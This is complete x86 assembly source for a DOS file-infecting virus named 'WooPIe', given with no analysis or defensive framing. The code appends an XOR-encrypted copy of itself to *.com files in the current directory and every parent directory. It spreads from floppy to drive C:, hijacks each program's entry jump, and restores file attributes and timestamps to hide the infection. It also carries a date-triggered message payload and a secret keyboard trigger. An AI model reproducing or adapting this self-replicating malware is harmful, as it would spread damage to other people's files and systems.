; NON-Resident WOOPIE, infects *.com files + higher directories
; encodes itself with XOR (256 possible)
; if loaded from floppy, it gets on HD c:

.286
dosseg
.model tiny
.stack   28h
.code

start:
        mov     ax,cs
        mov     ds,ax

        call    delta3
delta3: pop     bp
        sub     bp, offset delta3

call Infect_Dir

jmp Exit

;----------------------------------------------------------------
;----------------------------------------------------------------
;----------------------------------------------------------------

add_to_file:  ; Mark
        cli
        push    es
        push    ds

        mov     ax,cs
        mov     ds,ax

        call    delta
delta:  pop     bp
        sub     bp, offset delta

call    decode

encode_start:

        Call    CheckKey
        Call    DateCheck

        mov     al,[bp+offset jmpdata]
        mov     [bp+offset copy],al
        mov     al,[bp+offset jmpdata+1]
        mov     [bp+offset copy+1],al
        mov     al,[bp+offset jmpdata+2]
        mov     [bp+offset copy+2],al

        mov     ah,19h          ; get current drive number
        int     21h
        cmp     al,1
        ja      HDLoad
        jmp     ALoad

HDLoad:
        Call    TraverseDir
        jmp     Enough

ALoad:

        mov     ah,19h          ; get current drive number
        int     21h
        push    ax

        mov     dl,2            ; change to c:
        mov     ah,0eh
        int     21h

        Call    TraverseDir

        pop     dx              ; set drive back to what it was
        mov     ah,0eh
        int     21h
Enough:
        mov     al,[bp+offset copy]
        mov     [bp+offset jmpdata],al
        mov     al,[bp+offset copy+1]
        mov     [bp+offset jmpdata+1],al
        mov     al,[bp+offset copy+2]
        mov     [bp+offset jmpdata+2],al


        pop     ds
        pop     es      ; bring back original segments

        ; *** DisPatcher :

        mov      al,cs:[bp+offset jmpdata]
        mov      cs:[100h],al
        mov      al,cs:[bp+offset jmpdata+1]
        mov      cs:[101h],al
        mov      al,cs:[bp+offset jmpdata+2]
        mov      cs:[102h],al
        mov      ax,0100h       ; Jump back to the program
        push     ax
        sti
        ret
;-----------------------------------------------------
CheckKey:       ;proc
        mov     ah,2            ; check keyboard for Shft + Shft + CapsLock
        int     16h
        and     al,01000011b
        cmp     al,01000011b
        jne     NoShow

        mov     ax,0b800h
        mov     es,ax
        mov     al,2          ; Show up to master :
        mov     es:[158],al

NoShow:
        ret
;-----------------------------------------------------
DateCheck: ; Proc
        mov     ah,4h  ;       Check if after 3/7
        int     1ah
        cmp     dh,3   ;       Month
        jb      NoAction
        cmp     dl,3   ;       Day
        jb      NoAction
        Call    Action
NoAction:
        ret
;-----------------------------------------------------
Action:  ; Proc
        lea     dx,[bp+offset woopie]
        mov     ah,9
        mov     cx,77
Show:
        int     21h
        loop    Show
        ret
;----------------------------------------------------------------
TraverseDir proc near                               ; proc
        mov    ah,2fh           ; Get DTA adrs to es:bx
        int    21h
        mov    ax,es
        mov    ds,ax
        mov    ax,cs
        mov    es,ax
        mov    cx,43            ; coppy all 43 bytes
        lea    di,[bp+offset DTA]
        mov    si,bx
        rep    movsb

        mov     ax,cs
        mov     ds,ax

        lea     si,[bp+CurrentDir]         ; remenber current Dir
        mov     dl,0
        mov     ah,47h
        int     21h

        jc      Nomore

DirLoop:
        call    Infect_Dir

        lea     dx,[bp+BackDir]
        mov     ah,3bh
        int     21h
        jnc     DirLoop

        lea     dx,[bp+CurrentDir]         ; Change back to original dir
        mov     ah,3bh
        int     21h
NoMore:
        mov    ah,2fh           ; Get DTA adrs to es:bx
        int    21h
        mov    cx,43            ; coppy all 43 bytes
        lea    si,[bp+offset DTA]
        mov    di,bx
        rep    movsb

        ret

        BackDir    db '..',0
        CurrentDir db 64 dup (0),0
TraverseDir endp
;----------------------------------------------------------------
Infect_Dir:                                            ; proc

        lea     dx,[bp + offset ComFiles]

        mov     cx,111b         ; Set File Filter of the good files
        mov     ah,4eh
        int     21h
        jnc     GetName
        jmp     EndThis         ; Not Found

GetName:
        mov    ah,2fh           ; Get Fileanme
        int    21h

        mov    dx,es
        mov    ds,dx
        mov    dx,bx
        add    dx,1eh

        mov    ax,cs            ; Make a copy of the file name
        mov    es,ax
        mov    si,dx
        lea    di,[bp+file]
        mov    cx,7
        rep    movsw

        mov    ax,cs            ; get our ds back
        mov    ds,ax

        lea    dx,[bp+file]

        mov     ax,4300h        ; get file attributes
        int     21h
        jnc     ok1
        jmp     EndThis
ok1:
        mov     word ptr cs:[bp+atribs],cx

        mov     cx,0            ; set new attributes
        mov     ax,4301h
        int     21h

        mov     ax,3d02h        ;open file
        int     21h
        jnc     ok0
        jmp     error
ok0:
        mov     bx,ax

        mov     ax,5700h        ; get time / date
        int     21h
        mov     si,cx
        mov     di,dx

        lea     dx,cs:[bp+offset jmpdata]   ;read first 3 bytes to cs:data
        mov     cx,3
        mov     ah,3fh
        int     21h
        jnc     NOerror
        jmp     error
NOerror:
        mov     ax,4202h            ; go to the end of the file
        xor     cx,cx
        xor     dx,dx
        int     21h
        jc      error

        mov     dx,ax   ; Check if the file is infected already :
        sub     dx, offset e_add_to_file - offset add_to_file+ 3
        mov     cx,word ptr cs:[bp + offset jmpdata + 1]
        cmp     cx,dx
        jne     InfectF

        mov     ah,3eh               ; Close this file, and try another
        int     21h
        mov     ah,4fh
        int     21h
        jc      EndThis              ; No more files found
        jmp     GetName

InfectF:
        sub     ax,3                  ; Set up new jmp, which will go in front
        mov     cs:[bp + data2+1],al
        mov     cs:[bp + data2+2],ah

        call    Write2File

        mov     ax,4200h        ; Move back to start
        xor     cx,cx
        xor     dx,dx
        int     21h
        jc      error

        mov     ax,4000h        ;write jmp vir at the begining of file
        mov     cx,3
        lea     dx,[bp + data2]
        int     21h
        jc      error

        mov     ax,5701h        ; set time / date back
        mov     cx,si
        mov     dx,di
        int     21h

        mov     ah,3eh              ; close file
        int     21h
        jnc     NoExit
        jmp     exit
NoExit:
        lea     dx,cs:[bp+file]      ; bring back file attributes
        mov     cx,cs:[bp+offset atribs]
        mov     ax,4301h
        int     21h
EndThis:
        ret
Error:
        mov     ah,3eh               ; Close file
        int     21h
        jmp     EndThis

        ComFiles db '*.com',0
        file     db 15 dup (0)
        DTA      db 43 dup (0)
        data2    db 0E9h,?,?
        atribs   dw ?
e_Infect_Dir:
;----------------------------------------------------------------
        woopie   db 'WooPIe (:) $'
        copy     db ?,?,?
        jmpdata  db ?,?,?       ; Stores 3 bytes of the file
;----------------------------------------------------------------

encode_end:

Write2File:

        xor     ax,ax                   ; Generate new key
        mov     es,ax
        mov     al,es:[46ch]
        mov     cs:[bp + offset key],al

        call    encode

        lea     dx,[bp + offset add_to_file] ; save addtofile to end of file
        mov     cx,offset e_add_to_file-offset add_to_file
        mov     ax,4000h
        int     21h

        call    decode
ret

Encode:
Decode:
        push    bx
        push    ax
        push    dx

        lea     bx,[bp + offset encode_start]
        mov     ah,cs:[bp + offset key]
        lea     dx,[bp + offset encode_end]
here:
        mov     al,cs:[bx]
        xor     al,ah
        mov     cs:[bx],al
        inc     bx
        cmp     bx,dx
        jne     here

        pop     dx
        pop     ax
        pop     bx
ret
        key     db  ?
e_add_to_file: ;Mark


;----------------------------------------------------------------
;----------------------------------------------------------------
;----------------------------------------------------------------

exit:   mov     ah,4ch               ; terminate the program
        int     21h

end start